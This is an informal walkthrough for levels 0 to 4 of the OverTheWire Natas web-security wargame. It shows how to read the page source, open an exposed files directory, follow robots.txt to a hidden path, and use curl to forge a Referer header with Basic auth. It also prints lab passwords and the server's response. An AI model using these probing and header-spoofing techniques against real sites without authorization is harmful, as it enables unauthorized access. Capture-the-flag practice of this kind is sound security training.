# Level 0
Solution:
after you open link, open inspector check html code there you can find password

# Level 1
Solution in Level 1 is same for Level 0

# Level 2
So solution in this case is a bit hard to explain but basicly 
You should find an image tag like `<img src="file/pixel.png>` now you see that comes from database with this link `file/pixel.png` 
it means that you should you it as vulnerabilities to get key this is how:
`http://natas2.natas.labs.overthewire.org/files/`
there you find password for the next level

# Level 3
So get key from this problem we sould search for (google robots)[https://developers.google.com/search/docs/crawling-indexing/robots/create-robots-txt].
Bassicaly its `robots.txt` file that locks or allows access for all or a specific path to your domain
`http://natas3.natas.labs.overthewire.org/robots.txt` ---> here you get a hidden path `/s3cr3t/` and go to it

`http://natas3.natas.labs.overthewire.org/s3cr3t`--> key should be here

# Level 4
```
curl \                                                                                                                                                                               
  -H "Authorization: Basic $(echo -n 'natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ' | base64)" \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" 
  http://natas4.natas.labs.overthewire.org/     

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK #your pass #key to next level
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```
